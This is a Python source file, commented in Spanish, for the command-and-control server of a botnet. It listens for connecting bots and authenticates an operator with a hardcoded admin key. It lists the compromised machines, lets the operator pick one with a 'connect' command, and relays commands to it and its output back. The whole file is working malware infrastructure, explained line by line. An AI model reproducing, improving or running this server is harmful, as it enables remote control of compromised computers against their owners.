import socket #importamos socket
from threading import Thread #importamos la librería de procesos en segundo plano

ip = "0.0.0.0" #definimos la IP donde nos queremos conectar (siempre será localhost, claro)
port = 777 #definimos el puerto
separator_token = "<SEP>"  #definimos el separador
client_sockets = set() #definimos una lista de objetos que se corresponderá a los objectos de conexión de los usuarios conectados
s = socket.socket() #creamos el socket de conexión local
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #definimos las opciones SOL_SOCKET (para conexiones locales) y SO_REUSEADDR (iniciar servidor de escucha)
s.bind((ip, port)) #nos conectamos por bind
s.listen(100) #preparamos al socket para escuchar conexiones
print ("[*] A la escucha en puerto "+str(port)) #imprimimos la direccion (siempre será local) y el puerto al que los bots se están conectando


admin_key = "DFHBEWUQHDUUYGGSFYEUGGBZG3U7D7A3FDABGDBAGDBA7YGD7BAGWADYUDYGAWBTVDNAUGDUADUNWYBDTAYB" #definimos la misma admin key que en "admin.py"

admin = None #definimos el objeto "admin" encargado de almacenar el objeto de conexión del administrador

trgt = None #definimos el objeto "trgt" encargado de almacenar el objeto de conexión del target al que hayamos referenciado (con el comando "connect")

def listen_for_client(cs): #definimos una función de escucha de mensajes que funcione en segundo plano
    global trgt #definimos a nivel global la variable, para que sea posible acceder a ella a través de una función
    global admin #definimos a nivel global la variable, para que sea posible acceder a ella a través de una función
    while True: #creamos un bucle infinito para mantener abierta la escucha
        try: #definimos "try" para que siempre permanezca en funcionamiento aunque haya un error o warning
            datapacket = cs.recv(1024).decode() #definimos la variable "datapacket" con el mensaje en red recibido ya descodificado
        except Exception as e: #definimos una excepción del try 
            print("[!] Error: "+str(e)) #imprimimos el error
            print (cs) #imprimimos el objeto de conexión 
            client_sockets.remove(cs) #eliminamos el objeto de conexión
        else: #define una excepción segundaria
            datapacket = datapacket.replace(separator_token, ": ") #reemplaza los <SEP> por :
        if (datapacket == admin_key): admin = cs #crea una comparación de llaves entre la localmente definida y la enviada para definir la variable de administrador como el objeto de conexión utilizado (y que así no haya que enviar la admin key con cada paquete de datos)
        elif (datapacket == "list"): #si el mensaje enviado es "list"
            for sock in client_sockets: #recorrerá toda la lista de "client_sockets" en un bucle
                if sock != admin: #elimina el admin de la lista (para que no puedas acceder a ti mismo, no tendría sentido)
                    rawsock = str(sock).split("raddr=('")[1] #depura el array
                    rawsock = rawsock.split(")>")[0] #depura el array
                    rawsock = str(rawsock.replace("', ",":")) #depura el array
                    admin.send(rawsock.encode()) #envía al administrador, el paquete de respuesta a "lista" 
        elif ("connect" in datapacket): #si el mensaje enviado es "connect"
            for sock in client_sockets: #lista todos los objetos de conexión dentro de "client_sockets"
                addr = datapacket.replace("connect ","") #depura el mensaje
                ip_addr = addr.split(":")[0] #obtiene la IP a partir del mensaje
                pt_addr = addr.split(":")[1] #obtiene el puerto a partir del mensaje
                if (ip_addr in str(sock) and pt_addr in str(sock)): trgt = sock #comprueba la dirección y si coincide, definirá la variable de trgt al objetivo donde queremos que se envien los paquetes
        else: #sino es ninguno de los comandos por parte de la botnet:
            if (cs != admin): admin.send(datapacket.encode()) #si el objeto de conexión no es admin, enviar los paquetes
            if (trgt == None): admin.send("\nNecesitas espeficiar un objetivo al que enviar los paquetes de datos".encode()) #si aun no hay objeto de "trgt" devolver mensaje de ayuda
            else: trgt.send(datapacket.encode()) #si el objeto de conexión no está vacio, enviar los paquetes

while True: #define un bucle
    client_socket, client_address = s.accept() #acepta su propia conexión
    print("[+] "+str(client_address)+" Conectado a la botnet :)") #imprime la dirección
    client_sockets.add(client_socket) #añade la dirección del socket de conexión a la lista de clientes activos
    t = Thread(target=listen_for_client, args=(client_socket,)) #define un proceso de segundo plano con el bucle de escucha
    t.daemon = True #definimos que siempre corra en background
    t.start() #iniciamos el proceso de segundo plano

for cs in client_sockets: #cuando salga del bucle (proceso cerrado), que recorra todos los objetos de conexión
    cs.close() #cierra todos los objetos de conexión uno por uno
s.close() #cierra su propia conexión
